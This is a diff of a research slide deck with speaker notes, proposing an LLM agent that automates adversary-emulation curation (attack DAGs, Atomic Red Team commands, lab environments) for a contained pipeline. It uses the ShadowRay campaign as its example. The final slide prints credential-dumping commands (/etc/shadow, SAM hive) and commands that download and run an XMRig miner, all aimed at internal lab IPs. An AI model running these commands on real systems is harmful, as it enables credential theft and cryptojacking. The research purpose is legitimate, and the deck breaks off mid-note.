@@ -876,7 +876,7 @@ This is section three, and it is the reason we are all here tonight: the gap, an
 
 Everything up to now has been setup. You understand what ATT&CK gives us and what it withholds. You understand the lab and the containment rules. You understand Atomic Red Team as a catalog of per-technique commands. And you have walked the full six-stage pipeline, stage by stage, with its clean input-processing-output contract. Most importantly, you have seen that stages three, four, and five share a common "origin" extension point that today reads "human curation."
 
-In this section I am going to do four things. First, I will make brutally explicit what a human has to do by hand today, the manual gap, so the problem is concrete, not abstract. Second, I will state my proposal: an AI agent that fills that gap automatically. Third, I will show you the architecture of the agentic environment that drives the whole pipeline. And fourth, I will break down each component of the agent so you can see how the pieces map onto the stages you already know.
+In this section I am going to do three things. First, I will state my proposal: an AI agent that fills, automatically, the manual gap you already saw, the stages three, four, and five that a human curates by hand today. Second, I will show you the architecture of the agentic environment that drives the whole pipeline. And third, I will break down each component of the agent so you can see how the pieces map onto the stages you already know.
 
 This is where my individual contribution lives, as distinct from the foundation my colleagues and I built together. So let us start by being honest and specific about exactly how much human effort the current approach demands.
 -->
@@ -885,93 +885,36 @@ This is where my individual contribution lives, as distinct from the foundation 
 layout: default
 ---
 
-# The manual gap today
+# Proposal, an AI agent-centric approach
 
 <div class="grad-rule"></div>
 
-<div class="card edge-red" style="margin-bottom:.9rem;">
-<p>For the 8 curated campaigns, stages <strong>3, 4 and 5</strong> run on artifacts a human analyst produced <strong>by hand</strong>. That expert labor, done once per campaign, per environment, is the bottleneck this research removes.</p>
-</div>
+<div class="two-col even" style="gap:1.2rem;align-items:start;margin-top:1.6rem;">
 
-<div class="cards c3" style="gap:.9rem;">
-<div class="card edge-purple">
-<h3>Stage 3, DAG, by hand</h3>
-<p>The analyst reasons out the <strong>order &amp; dependencies</strong> of the campaign's techniques and writes the DAG.</p>
-</div>
-<div class="card edge-purple">
-<h3>Stage 4, Commands, by hand</h3>
-<p>For each technique, the analyst <strong>selects, parametrizes &amp; sequences</strong> a concrete command (e.g. from Atomic Red Team) and derives the environment needs.</p>
-</div>
-<div class="card edge-purple">
-<h3>Stage 5, Environment, by hand</h3>
-<p>The analyst <strong>designs the target hosts, services &amp; vulnerabilities</strong> and wires them into the isolated lab.</p>
-</div>
-</div>
-
-<div class="cards c2" style="margin-top:.9rem;gap:1rem;">
-<div class="card flat edge-blue"><p><strong>Slow &amp; expert-bound</strong>, deep knowledge of ATT&amp;CK, the campaign, tooling and networking. Does not scale to many campaigns.</p></div>
-<div class="card flat edge-red"><p><strong>The two faces of the gap</strong>, command semantics (Stage 4) <em>and</em> environment emulation (Stage 5), with structure (Stage 3) on top.</p></div>
-</div>
-
-<!--
-Let me make the manual gap concrete, because it is easy to say "a human curates it" and gloss over just how much skilled work that sentence hides.
-
-For each of the eight curated campaigns, stages three, four, and five run entirely on artifacts that a human analyst produced by hand. My colleagues, Roth and Sidnei, did this work. Let me spell out what "by hand" actually means for each stage.
-
-In stage three, the analyst has to reason out the campaign's structure. Given a set of techniques, in what order did this specific APT actually use them, and which steps depend on which? Getting that wrong means the emulation runs steps in an impossible order. The analyst encodes that reasoning as the DAG, by hand.
-
-In stage four, for every technique in that DAG, the analyst has to select a concrete command that performs it, often drawing on Atomic Red Team, then parametrize it for our specific targets, our specific IP addresses and hosts, and sequence it. And while doing so, they have to work out what the environment must provide for each command to succeed. This is the densest, most expertise-heavy work in the whole process.
-
-In stage five, the analyst designs the environment itself: which target hosts need to exist, what services they must run, what vulnerabilities they must expose for the campaign's techniques to land, and how to wire all of that into the isolated lab's networks. 
-
-Step back and look at the bottom cards. First, this is slow and expert-bound. It demands deep, simultaneous knowledge of ATT&CK, of the particular campaign, of offensive tooling, and of networking. Very few people can do it well, and even they do it slowly. It simply does not scale, reproducing dozens or hundreds of campaigns by hand is not realistic.
-
-Second, and this is the framing I want you to carry into the proposal, the gap has two faces, plus structure on top. There is the command-semantics face, which is stage four: turning techniques into runnable, parametrized, ordered commands. And there is the environment-emulation face, which is stage five: building the target environment those commands attack. Sitting over both is the structural reasoning of stage three, the DAG. My proposal, which is the next slide, is an AI agent that takes over all three.
--->
-
----
-layout: default
----
-
-# Proposal, the AI curation agent
-
-<div class="grad-rule"></div>
-
-<div class="two-col">
 <div class="tight">
 
-<div class="card edge-grad">
+<div class="card flat edge-grad" style="padding:.55rem .8rem;">
 <h3>The idea</h3>
-<p>Replace the <strong>human-curation</strong> implementation of stages 3–5 with <strong>AI-generated</strong> curation, through the <code>origin</code> extension point the pipeline already exposes.</p>
-<div style="margin-top:.4rem;">
-<code>origin: human_curation</code> &nbsp;→&nbsp; <code>origin: ai_generated</code>
-</div>
+<p>Swap the <strong>human-curation</strong> of stages 3–5 for <strong>AI generation</strong>, via the existing <code>origin</code> seam: <code>human_curation</code> → <code>ai_generated</code>.</p>
 </div>
 
-<div class="card edge-blue">
+<div class="card flat edge-blue" style="padding:.55rem .8rem;">
 <h3>What the agent produces</h3>
 <ul>
-<li><strong>Stage 3:</strong> the campaign DAG (structure)</li>
-<li><strong>Stage 4:</strong> the executable, parametrized commands (<strong>command semantics</strong>)</li>
-<li><strong>Stage 5:</strong> the target environment design (<strong>environment emulation</strong>)</li>
+<li><strong>Stage 3:</strong> the DAG (structure)</li>
+<li><strong>Stage 4:</strong> parametrized commands (command semantics)</li>
+<li><strong>Stage 5:</strong> the target environment (emulation)</li>
 </ul>
 </div>
 
-<div class="card edge-red">
-<h3>No pipeline redesign</h3>
-<p>Stages 1, 2 and 6 are unchanged. The agent swaps in behind the same seams; <strong>safety gates stay exactly as they are</strong>.</p>
-</div>
+<div class="card flat edge-red" style="padding:.55rem .8rem;"><p><strong>No pipeline redesign:</strong> stages 1, 2, 6 unchanged; the agent slots behind the same seams and <strong>safety gates stay as they are</strong>.</p></div>
+
+<div class="card flat edge-purple" style="padding:.55rem .8rem;"><p><strong>Evaluation payoff:</strong> run on the same 8 campaigns, measure procedural sufficiency (Stage 6), a quantitative <strong>AI-vs-human</strong> comparison.</p></div>
 
 </div>
 
 <div>
-<div class="imgframe" style="height:200px;">
-<img src="/images/code-screen.jpg" alt="code" />
-</div>
-<div class="card flat edge-purple" style="margin-top:.7rem;">
-<h3>The evaluation payoff</h3>
-<p>Run the agent on the same 8 campaigns and <strong>measure procedural sufficiency</strong> (Stage 6), a direct, quantitative <strong>AI-vs-human</strong> comparison.</p>
-</div>
+<img src="/images/ai-architecture.svg" style="display:block;width:100%;height:520px;object-fit:contain;object-position:top;background:#fff;border-radius:8px;" alt="AI agent architecture overview" />
 </div>
 
 </div>
@@ -985,123 +928,382 @@ What does the agent actually produce? The middle card lists it, and it maps one-
 
 The bottom-left card makes an important promise: no pipeline redesign. Stages one, two, and six do not change at all. Stage one still selects and downloads the bundle; stage two still extracts campaign attributes; stage six still executes, measures, and tears down, and critically, all of its safety gates stay exactly as they are. The AI agent is not trusted to bypass containment. Everything it generates still passes through the same preview, the same confirmation, the same containment and isolation gates, the same audit. The agent proposes; the safety machinery disposes. That separation is deliberate: we get automation without weakening a single security guarantee.
 
-And the right side is the scientific payoff, which is really why this is a research project and not just an engineering convenience. Because stage six gives us a quantitative measure of procedural sufficiency, we can run the agent on the very same eight campaigns that humans curated, and directly compare the numbers. Does AI-generated curation reach the same success rate as expert human curation? Where does it fall short, and on which kinds of techniques? That head-to-head, AI-versus-human, measured on an identical pipeline, is the result the research is after. Now let me show you how the agent is actually built, the architecture.
+On the right you see the whole thing at a glance: the architecture of the agentic environment that drives the pipeline. I am showing it now, up front, so you have the complete picture in your head, knowledge sources on the left, the orchestrated agent with its per-stage sub-agents in the center, execution and evaluation on the right, and the feedback loop from stage six curving back. Do not worry about the detail yet; the very next slide zooms into it piece by piece.
 
-Image credit: "Computer coding on a screen", rawpixel, CC0 (public domain), via Openverse.
+The last card on the left is the scientific payoff, which is really why this is a research project and not just an engineering convenience. Because stage six gives us a quantitative measure of procedural sufficiency, we can run the agent on the very same eight campaigns that humans curated, and directly compare the numbers. Does AI-generated curation reach the same success rate as expert human curation? Where does it fall short, and on which kinds of techniques? That head-to-head, AI-versus-human, measured on an identical pipeline, is the result the research is after. Now let me walk through that architecture in detail.
 -->
 
 ---
 layout: default
 ---
 
-# AI environment architecture
+# Orchestrator / planner (LLM)
 
 <div class="grad-rule"></div>
 
-<div class="imgframe" style="height:360px;">
-<img src="/images/ai-architecture.svg" style="object-fit:contain;background:#fff;" alt="AI agent architecture" />
-</div>
+<div class="two-col">
+<div class="tight">
 
-<div style="margin-top:.5rem;font-size:.82rem;color:var(--ink-soft);">
-Knowledge &amp; tools feed an <strong>orchestrated agent</strong> whose per-stage sub-agents produce the DAG, the commands and the environment; Stage 6's verdict <strong>feeds back</strong> to refine them, all under fixed safety guardrails.
-</div>
-
-<!--
-This is the architecture of the agentic environment that will drive the whole pipeline. Let me read it left to right, because it tells a story.
-
-On the left are the knowledge and tool sources, the raw material the agent reasons over. There is the STIX and ATT&CK threat intelligence, which gives the campaign's techniques, relationships, and attributes. There is Atomic Red Team, the catalog of per-technique commands and their prerequisites. There is the lab catalog and compose definition, which describes the available hosts, services, and internal networks. And there are the eight human-curated cases, which serve as ground truth, both as examples the agent can learn from or be evaluated against.
-
-In the center is the agent environment itself. At the top sits an orchestrator, an LLM-driven planner. Its job is to drive the stages and call tools, while respecting the same input-processing-output contract the pipeline defines. Below it are four specialized sub-agents, and notice how they line up exactly with the stages you already know. The DAG agent handles stage three, it orders the techniques into a dependency graph, emitting origin "AI generated." The operationalization agent handles stage four, it selects and parametrizes commands from Atomic Red Team and derives the environment parameters; this is the command-semantics gap. The environment agent handles stage five, it designs and provisions the target environment; this is the environment-emulation gap. And the measurement loop handles the feedback from stage six, it reads the verdict and telemetry, and feeds failures back to refine the DAG, the commands, or the environment.
-
-Underneath those sub-agents is a shared layer of deterministic tools, the STIX parser, the Atomic Red Team lookup, the Docker and compose driver, the Caldera API, and the command parser. The agents reason and plan, but the actual actions go through these deterministic, injectable tools, which are read-only wherever they inspect. That keeps the risky operations predictable and testable, rather than letting the LLM free-form its way into the system.
-
-And framing the entire center block, at the bottom, are the safety guardrails, which are non-negotiable and unchanged from the existing pipeline: every generated command and target is validated against the internal subnets, isolation is verified read-only and fail-closed before any execution, there is explicit preview and confirmation, a one-to-one audit, and the agent never, ever runs on the host.
-
-On the right is execution and evaluation: the isolated Docker lab where the campaign runs, the procedural-sufficiency measurement, and the evaluation goal, comparing AI curation against the eight human cases on the same measurable pipeline. The dashed arrow curving back is the feedback loop: the verdict informs the next iteration. That loop is what makes this an agent rather than a one-shot generator. Let me now zoom into the individual components.
--->
-
----
-layout: default
----
-
-# Agent components: structure &amp; commands
-
-<div class="grad-rule"></div>
-
-<div class="cards c2" style="gap:1rem;">
-
-<div class="card edge-purple">
-<h3>DAG-generation agent · Stage 3</h3>
-<p><strong>Input:</strong> campaign attributes + techniques (from Stage 2).</p>
-<p><strong>Tools:</strong> STIX/ATT&amp;CK reader, technique knowledge.</p>
-<p><strong>Reasoning:</strong> infer the <strong>ordering &amp; dependencies</strong> of the campaign's techniques, the structure Atomic Red Team lacks.</p>
-<p><strong>Output:</strong> a campaign DAG with <code>origin = ai_generated</code>, drop-in behind the <code>DagGenerator</code> seam.</p>
-</div>
-
-<div class="card edge-purple">
-<h3>Operationalization agent · Stage 4</h3>
-<p><strong>Input:</strong> the DAG (from Stage 3).</p>
-<p><strong>Tools:</strong> Atomic Red Team lookup, command parser, executor catalog.</p>
-<p><strong>Reasoning:</strong> per node, <strong>select</strong> the command, <strong>parametrize</strong> it for the target, place it in <strong>DAG order</strong>; then <strong>derive the environment parameters</strong>.</p>
-<p><strong>Output:</strong> ordered Abilities + Adversary <em>and</em> the environment-parameter spec, the <strong>command-semantics gap, automated</strong>.</p>
-</div>
-
-</div>
-
-<div class="card flat edge-blue" style="margin-top:1rem;">
-<p>Both components slot into the <strong>existing seams</strong> (<code>DagGenerator</code>, <code>OperationalizerByOrigin</code>), the pipeline, UI and safety gates consume their output exactly as they consume human curation today.</p>
-</div>
-
-<!--
-Let me zoom into the first two components of the agent, the ones that handle structure and commands, stages three and four.
-
-Start with the DAG-generation agent, on the left, which owns stage three. Its input is the campaign attributes and techniques that stage two extracted. Its tools are a STIX and ATT&CK reader plus technique knowledge, essentially the ability to look up what each technique is and how techniques typically relate. Its reasoning task is to infer the ordering and dependencies among the campaign's techniques: given that this APT used these ten techniques, in what sequence did they realistically occur, and which ones are prerequisites for which others? This is genuine reasoning, because the raw threat intelligence rarely states the order explicitly, a human infers it, and now the agent must. Its output is a campaign DAG carrying origin "AI generated," and because it conforms to the existing DAG-generator interface, it is a true drop-in: the rest of the pipeline cannot tell, structurally, whether a human or the agent produced it.
-
-Now the operationalization agent, on the right, which owns stage four, and this is the richest component, because it is the command-semantics gap made automatic. Its input is the DAG from stage three. Its tools are the Atomic Red Team lookup, a command parser, and the executor catalog. Its reasoning runs per node of the DAG and has three moves. First, select: choose the right command that implements this node's technique, typically from Atomic Red Team. Second, parametrize: fill in the specifics for our target, the actual IP address, the actual hostname, the actual file path. Third, order: place it correctly in the DAG sequence. And then, as a fourth move, it derives the environment parameters from those commands, recall that a command's dependencies, input arguments, and supported platforms essentially are the environment requirements. Its output is therefore the same pair of artifacts the human produces: the ordered Abilities and Adversary, plus the environment-parameter specification. This single component automates the densest expert labor in the entire process.
-
-The card at the bottom is the reassurance that this is engineering-feasible, not hand-waving. Both of these agents slot into seams that already exist in the codebase, the DAG-generator interface and the operationalizer-by-origin interface. That means the pipeline, the user interface, and crucially the safety gates all consume the agent's output through exactly the same path they use for human curation today. Nothing downstream has to change or be re-validated. The next slide covers the remaining two components, the environment agent and the feedback loop, plus the guardrails they all operate under.
--->
-
----
-layout: default
----
-
-# Agent components: environment &amp; feedback
-
-<div class="grad-rule"></div>
-
-<div class="cards c2" style="gap:1rem;">
-
-<div class="card edge-red">
-<h3>Environment-provisioning agent · Stage 5</h3>
-<p><strong>Input:</strong> the environment parameters (from Stage 4).</p>
-<p><strong>Tools:</strong> Docker/compose driver, health &amp; isolation inspectors.</p>
-<p><strong>Reasoning:</strong> design the target hosts, services &amp; vulnerabilities; choose the online-build vs. offline-isolated split; provision &amp; load Abilities.</p>
-<p><strong>Output:</strong> an isolated environment with <code>origin = ai_generated</code>, the <strong>environment-emulation gap, automated</strong>.</p>
+<div class="card edge-grad">
+<h3>What it is</h3>
+<p>The <strong>LLM-driven brain</strong> of the agent. It does not generate artifacts itself, it <strong>plans the work and delegates</strong> each stage to the right sub-agent, respecting the pipeline's <strong>Input → Processing → Output</strong> contract.</p>
 </div>
 
 <div class="card edge-blue">
-<h3>Measurement &amp; feedback loop · Stage 6</h3>
-<p><strong>Input:</strong> the execution report, success rate, failed nodes, per-technique telemetry, verdict.</p>
-<p><strong>Reasoning:</strong> diagnose <em>why</em> a node failed → refine the DAG, a command, or the environment, and re-run.</p>
-<p><strong>Output:</strong> an improved curation, iterating toward <strong>procedural sufficiency</strong>.</p>
+<h3>How it works, per campaign</h3>
+<ul>
+<li><strong>Plan:</strong> read the goal + current stage state from memory, decide the next step.</li>
+<li><strong>Retrieve:</strong> pull grounding context via RAG (CTI, ART, past runs).</li>
+<li><strong>Route:</strong> hand off to the DAG / operationalization / environment / measure sub-agent.</li>
+<li><strong>Call tools:</strong> only through the deterministic tool layer, never free-form.</li>
+<li><strong>Loop:</strong> consume Stage 6's verdict and re-plan until sufficiency stops improving.</li>
+</ul>
 </div>
 
 </div>
 
-<div class="card flat edge-grad" style="margin-top:1rem;">
-<h3>Shared guardrails, the agent proposes, the safety machinery disposes</h3>
-<p>Every agent output still passes the <strong>containment</strong> check, the <strong>read-only fail-closed isolation</strong> gate, the <strong>explicit preview + confirmation</strong>, and the <strong>1:1 audit</strong>. The agent <strong>never runs on the host</strong> and never bypasses a gate. Automation is added <strong>without weakening any security guarantee</strong>.</p>
+<div class="tight">
+<div class="card edge-red">
+<h3>Why a planner at all</h3>
+<p>The four stages are <strong>interdependent</strong>: a command (St.4) constrains the environment (St.5); a failure (St.6) may point back to the DAG (St.3). A central planner lets the agent <strong>reason across stages</strong>, yet it has <strong>no privileged access</strong>, every action flows through the same tools and safety gates as human curation.</p>
+</div>
+
+<div class="card edge-purple">
+<h3>Candidate LLMs &amp; wiring in STICKS</h3>
+<ul>
+<li>GLM-5.3-Flash</li>
+<li>Qwen-35B</li>
+<li>Qwen3.8-Flash-Next</li>
+</ul>
+<p style="margin-top:.35rem;">Behind one <code>LlmClient</code> port, pick via <code>.env</code> (<code>LLM_PROVIDER</code>, <code>LLM_MODEL</code>, <code>LLM_API_KEY</code>). <strong>Swapping models is config, not code.</strong></p>
+</div>
+</div>
+
 </div>
 
 <!--
-Here are the last two components of the agent, the environment agent and the measurement-and-feedback loop, and then the guardrails they all live under.
+This is the first of five component slides, the orchestrator or planner, which is the brain of the whole agent.
 
-On the left is the environment-provisioning agent, which owns stage five and automates the environment-emulation half of the gap. Its input is the environment-parameter specification that the operationalization agent produced. Its tools are the Docker and compose driver and the health and isolation inspectors. Its reasoning task is to translate those parameters into an actual target environment: decide which hosts must exist, which services and vulnerabilities each must expose so the campaign's techniques can land, and then choose the provisioning strategy, in particular the online-build versus offline-isolated split we discussed, deciding what has to be installed during the egress window and what can be configured offline. It then provisions the environment and loads the Abilities. Its output is an isolated, ready environment tagged origin "AI generated." This is the component that frees a human from hand-designing the battlefield for every campaign.
+The key thing to understand, top-left, is that the orchestrator does not itself write the DAG or the commands. It is an LLM-driven planner: its job is to decide what to do next and delegate the actual work to the right specialized sub-agent, always respecting the same Input-Processing-Output contract the pipeline defines for every stage.
 
-On the right is the measurement-and-feedback loop, which closes the cycle using stage six. Its input is the execution report, the success rate, the list of failed nodes, the per-technique telemetry, and the overall verdict. Its reasoning is diagnostic: for a node that failed, why did it fail? Was the command wrong or mis-parametrized? Was a dependency missing, which is really a stage-four problem? Did the environment lack a service the technique needed, which is a stage-five problem? Based on that diagnosis, the agent refines the relevant artifact, the DAG, a command, or the environment, and re-runs. Its output is an improved curation, iterating toward higher procedural sufficiency. This loop is exactly what elevates the system from a one-shot generator to a genuine agent: it uses the measurable verdict as a reward signal and improves.
+How does it work in practice, for a single campaign? Follow the loop on the left. First it plans: it reads the overall goal and the current stage state from the agent's memory, and decides the next step. Then it retrieves: through RAG it pulls the grounding context it needs, the threat intelligence, the Atomic Red Team entries, lessons from past runs. Then it routes: it hands the task to the appropriate sub-agent, DAG, operationalization, environment, or measurement. Crucially, when any actual action has to happen, it goes through the deterministic tool layer, the planner never free-forms a command into the system. And finally it loops: it consumes the verdict from stage six and re-plans, iterating until procedural sufficiency stops improving.
 
-And now the frame around all four components, the shared guardrails, which I have stressed throughout and will state one final time because it is the ethical and technical heart of doing this safely. The agent proposes; the safety machinery disposes. Every single thing the agent generates, every DAG, every command, every environment, still passes through the unchanged safety gates: the containment check that rejects any external target, the read-only fail-closed isolation gate, the explicit preview and human confirmation, and the one-to-one audit. The agent never runs on the host and can never bypass a gate. The result is that we add powerful automation without weakening a single security guarantee. That is a deliberate design stance: an autonomous agent generating attacks is only acceptable if it is boxed inside a containment system it cannot override, and it is. With the proposal fully laid out, let me close by showing what is already proven and where this goes next.
+On the right, why have a central planner at all, why not four independent generators? Because the stages are deeply interdependent. The command you choose in stage four constrains what the environment in stage five must provide. A failure in stage six might actually be a stage-three structural problem, not a stage-four command problem. A central planner is exactly what lets the agent reason across those stage boundaries, rather than treating each stage as an isolated, context-free call.
+
+The second card on the right answers the obvious practical question, which model do I actually use? The orchestrator is model-agnostic, and for this work I have access to three at my institution: GLM-5.3-Flash, Qwen-35B, and Qwen3.8-Flash-Next. In STICKS the wiring is deliberately simple: everything sits behind a single LlmClient port, and you select the provider and model through environment variables, LLM_PROVIDER, LLM_MODEL, and an API key. Swapping models is a config change, not a code change, which also means we can run the same evaluation across the three models and compare them directly.
+
+And the boundary card at the bottom restates the safety stance at the level of the planner specifically: the planner proposes and orchestrates, but it has no privileged access of its own. Every concrete action it triggers still flows through the same deterministic tools and the same safety gates that human curation uses. The intelligence is centralized; the authority is not.
+-->
+
+---
+layout: default
+---
+
+# DAG agent (Stage 3)
+
+<div class="grad-rule"></div>
+
+<div class="two-col">
+<div class="tight">
+
+<div class="card edge-purple">
+<h3>Job</h3>
+<p>Turn a <strong>flat set of techniques</strong> into a <strong>directed acyclic graph</strong>, the campaign's ordering and dependencies, the structure Atomic Red Team does not carry.</p>
+</div>
+
+<div class="card edge-blue">
+<h3>How it works</h3>
+<ul>
+<li><strong>Input:</strong> campaign attributes + techniques (from Stage 2).</li>
+<li><strong>Retrieve:</strong> for each technique, its tactic/kill-chain phase and typical prerequisites (STIX/ATT&amp;CK + RAG over past DAGs).</li>
+<li><strong>Reason:</strong> infer a plausible <strong>order</strong> (recon → exploit → lateral → exfil) and the <strong>edges</strong> (which step depends on which).</li>
+<li><strong>Validate:</strong> enforce acyclicity and that every technique appears exactly once.</li>
+</ul>
+</div>
+
+</div>
+
+<div class="tight">
+<div class="card edge-red">
+<h3>Output</h3>
+<p>A campaign DAG (nodes + edges) tagged <code>origin = ai_generated</code>, dropped in behind the existing <code>DagGenerator</code> seam, <strong>structurally indistinguishable</strong> from a human-made DAG downstream.</p>
+</div>
+
+<div class="card flat edge-purple" style="padding:.6rem .8rem;"><p><strong>Why it is real reasoning:</strong> the CTI rarely states the order explicitly. A human infers it from how the APT operated; now the agent must infer the same, and we can grade it against the 8 human DAGs.</p></div>
+</div>
+
+</div>
+
+<!--
+Component two is the DAG agent, which owns stage three, the structural reasoning.
+
+Its job, top-left, is to take a flat, unordered set of techniques, the techniques stage two extracted, and turn them into a directed acyclic graph that encodes the campaign's ordering and its dependencies. This is precisely the structure that Atomic Red Team does not give you; ART hands you a command per technique in isolation, with no notion of campaign-level sequence.
+
+How does it work? Walk down the left card. The input is the campaign attributes and techniques from stage two. Then it retrieves: for each technique it looks up its tactic, its kill-chain phase, and its typical prerequisites, using the STIX and ATT&CK reader plus RAG over the DAGs it has seen before. Then the core move, reasoning: it infers a plausible order, roughly reconnaissance, then exploitation, then lateral movement, then exfiltration, and, just as important, it infers the edges, which concrete step depends on which other step. Finally it validates its own output: the graph must be acyclic, and every technique must appear exactly once, no orphans, no duplicates.
+
+The output, top-right, is a campaign DAG, nodes and edges, tagged origin equals AI-generated, and it drops in behind the existing DAG-generator seam. Downstream, nothing can tell structurally whether a human or the agent produced it, which is exactly what makes the swap clean.
+
+And the bottom card is the point I most want you to take away about this component: this is genuine reasoning, not lookup. The raw threat intelligence almost never states the execution order explicitly. A human analyst infers it from understanding how the APT actually operated. The agent has to infer the same thing, and because we have eight human-curated DAGs, we can grade the agent's structure against the human's, technique by technique.
+-->
+
+---
+layout: default
+---
+
+# DAG agent — candidate graphs for ShadowRay
+
+<div class="grad-rule"></div>
+
+<div style="font-size:.8rem;color:var(--ink-soft);margin-bottom:.5rem;">Same 10 ShadowRay techniques, three structures the agent might propose, each scored against the human DAG by Stage 6.</div>
+
+<div class="cards c3" style="gap:.8rem;align-items:start;">
+
+<div class="card edge-purple" style="padding:.5rem .6rem;">
+<h3 style="margin:0 0 .2rem;">A · Linear kill-chain</h3>
+
+```mermaid
+flowchart LR
+  A["T1190 Exploit"] --> B["T1027 Encode"] --> C["T1003 Creds"] --> D["T1068 PrivEsc"] --> E["T1496 Mine"]
+```
+
+<p style="font-size:.72rem;margin:.3rem 0 0;">Straight chain: access → evade → steal → escalate → impact.</p>
+</div>
+
+<div class="card edge-blue" style="padding:.5rem .6rem;">
+<h3 style="margin:0 0 .2rem;">B · Branch after access</h3>
+
+```mermaid
+flowchart LR
+  A["T1190 Exploit"] --> B["T1027 Encode"]
+  A --> F["T1588 Tool"]
+  B --> C["T1003 Creds"]
+  F --> G["T1105 Transfer"]
+  C --> D["T1068 PrivEsc"]
+  G --> D
+  D --> E["T1496 Mine"]
+```
+
+<p style="font-size:.72rem;margin:.3rem 0 0;">Credential path and tooling path run in parallel, rejoin at priv-esc.</p>
+</div>
+
+<div class="card edge-red" style="padding:.5rem .6rem;">
+<h3 style="margin:0 0 .2rem;">C · Discovery-first</h3>
+
+```mermaid
+flowchart LR
+  A["T1190 Exploit"] --> H["T1016 Discover"]
+  H --> I["T1059 Python"]
+  H --> C["T1003 Creds"]
+  I --> G["T1105 Transfer"]
+  C --> D["T1068 PrivEsc"]
+  G --> E["T1496 Mine"]
+  D --> E
+```
+
+<p style="font-size:.72rem;margin:.3rem 0 0;">Recon fans out into execution and credential access before impact.</p>
+</div>
+
+</div>
+
+<div class="card flat edge-grad" style="margin-top:.7rem;padding:.5rem .8rem;"><p style="font-size:.8rem;"><strong>The agent proposes structures; Stage 6 picks the winner.</strong> Each candidate is a hypothesis about ordering &amp; dependencies, rendered as the same Mermaid DAG the pipeline already shows, and measured against procedural sufficiency.</p></div>
+
+<!--
+This slide makes the DAG agent concrete. Instead of talking about structure in the abstract, here are three different DAGs the agent might actually generate for ShadowRay, using the real techniques from that campaign, the ones you saw executed in the lab.
+
+They all contain the same campaign techniques; what differs is the structure, the agent's hypothesis about order and dependencies. Read them left to right.
+
+Candidate A is the simplest: a straight linear kill-chain. Exploit the public-facing Ray service, encode the payload to evade detection, dump credentials, escalate privileges, and finally hijack compute to mine, that last step is the actual ShadowRay objective, cryptomining. It is clean and plausible, but it assumes everything happens in one strict line.
+
+Candidate B is more sophisticated: it branches right after initial access. One branch handles the credential path, encode then dump credentials; a parallel branch handles tooling, acquire the tool then transfer it in. Both branches have to complete before privilege escalation, and then mining. This reflects a realistic insight: fetching your tooling and stealing credentials are independent activities that can overlap.
+
+Candidate C leads with discovery: after the exploit, the agent does network configuration discovery first, and from that recon it fans out into two things, running Python for execution and dumping credentials, before converging on privilege escalation and impact. This is the hypothesis that an attacker orients before committing.
+
+The point of showing three is the bottom card: the agent does not have to be right on the first try. Each of these is a hypothesis about the campaign's structure, and because every one renders as the same kind of Mermaid DAG the pipeline already displays, and because stage six can measure the procedural sufficiency of each, the system can actually tell which structure reproduces ShadowRay best. The agent proposes; the measurement decides. That is the DAG agent and the feedback loop working together.
+-->
+
+---
+layout: default
+---
+
+# Operationalization agent (Stage 4)
+
+<div class="grad-rule"></div>
+
+<div class="card flat edge-purple" style="padding:.45rem .8rem;margin-bottom:.5rem;"><p style="font-size:.82rem;"><strong>Job:</strong> for every DAG node, <strong>select</strong> a command (Atomic Red Team), <strong>parametrize</strong> it (IP, host, path, creds), <strong>order</strong> it, and <strong>derive the environment needs</strong> → emits the ordered Abilities + the env-parameter spec for Stage 5.</p></div>
+
+<div class="cards c2" style="gap:.8rem;align-items:start;">
+
+<div class="tight">
+<div style="font-size:.76rem;font-weight:700;color:var(--sticks-purple);margin-bottom:.25rem;">Concrete commands it picked for ShadowRay</div>
+
+<div class="card edge-purple" style="padding:.4rem .6rem;">
+<p style="font-size:.74rem;margin:0 0 .15rem;"><strong>T1190</strong> Exploit Public-Facing App <span class="pill purple">initial-access</span></p>
+
+```sh
+curl -X POST -F 'cmd=whoami' http://192.168.20.30:5055/exec
+```
+
+</div>
+
+<div class="card edge-blue" style="padding:.4rem .6rem;">
+<p style="font-size:.74rem;margin:0 0 .15rem;"><strong>T1003.008</strong> /etc/passwd &amp; /etc/shadow <span class="pill blue">cred-access</span></p>
+
+```sh
+ssh root@192.168.20.30 'cat /etc/passwd && cat /etc/shadow'
+```
+
+</div>
+
+<div class="card edge-red" style="padding:.4rem .6rem;">
+<p style="font-size:.74rem;margin:0 0 .15rem;"><strong>T1105</strong> Ingress Tool Transfer <span class="pill red">C2</span></p>
+
+```sh
+curl http://192.168.20.30:8000/xmrig -o /tmp/xmrig; /tmp/xmrig
+```
+
+</div>
+</div>
+
+<div class="tight">
+<div style="font-size:.76rem;font-weight:700;color:var(--sticks-blue);margin-bottom:.25rem;">One technique → many commands (picks the executor for the target OS)</div>
+
+<div class="card edge-blue" style="padding:.4rem .6rem;">
+<p style="font-size:.74rem;margin:0 0 .15rem;"><strong>T1003</strong> · OS Credential Dumping</p>
+
+```sh
+# linux    cat /etc/shadow
+# windows  reg save HKLM\SAM sam.hive
+# macos    defaults read .../ShadowHashData
+```
+
+</div>
+
+<div class="card edge-purple" style="padding:.4rem .6rem;">
+<p style="font-size:.74rem;margin:0 0 .15rem;"><strong>T1105</strong> · Ingress Tool Transfer</p>
+
+```sh
+# linux    curl http://10.0.0.5/t -o /tmp/t
+# windows  Invoke-WebRequest http://10.0.0.5/t -OutFile t.exe
+# macos    curl -O http://10.0.0.5/t && chmod +x t
+```
+
+</div>
+
+<div class="card flat edge-grad" style="padding:.4rem .6rem;"><p style="font-size:.74rem;"><strong>Same technique, different command, different environment needs.</strong> The OS choice propagates to Stage 5, a Windows command needs a Windows host.</p></div>
+</div>
+
+</div>
+
+<!--
+This is the operationalization agent, stage four, the richest sub-agent, because it is the command-semantics gap made automatic. Everything is on one slide: what it does, and two kinds of example.
+
+The banner at the top is the job, stated textually. For every node in the DAG, the agent does four things: it selects a command that implements the technique, drawing on Atomic Red Team; it parametrizes that command with the real target specifics, the IP, the hostname, the path, the credentials; it orders it within the DAG so dependencies are satisfied; and it derives the environment requirements, because a command's prerequisites and platform essentially define what the environment must provide. The output is the pair a human produces: the ordered Abilities plus the environment-parameter spec that feeds stage five.
+
+The left column is the concrete proof: these are real commands the agent picked for ShadowRay. T1190 POSTs to the vulnerable Ray exec endpoint. T1003.008 SSHes in and dumps /etc/passwd and /etc/shadow. T1105 pulls the XMRig miner onto the host and runs it, which is ShadowRay's actual goal. Notice they are fully parametrized with real IPs and credentials, not templates.
+
